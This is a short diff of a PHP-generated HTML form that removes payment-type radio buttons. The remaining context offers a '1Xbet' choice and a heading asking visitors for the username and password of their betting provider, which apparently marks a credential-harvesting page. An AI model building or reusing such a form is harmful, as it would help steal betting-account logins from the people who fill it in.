@@ -14,16 +14,6 @@ echo <<< END_OF_TEXT
 <label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="1Xbet" id="1Xbet" required>1Xbet</label><br>
 
 
-<div id="payCC" class="floatBlock">
-<label for="paymentCC"> <input id="paymentCC" name="paymentType" type="radio" value="CREDIT_CARD" />  Credit Card  </label>
-</div>
-
-<div id="payInvoice" class="floatBlock">
-<label for="paymentInv"> <input id="paymentInv" name="paymentType" type="radio" value="INVOICE" /> Invoice </label>
-</div>
-
-<div id="pay3rdParty" class="floatBlock">
-<label for="payment3rd"> <input id="payment3rd" name="paymentType" type="radio" /> Third Party </label>
 
 
 <h2>ENTER THE USERNAME AND PASSWORD OF YOUR BETTING HOST PROVIDER</h2>
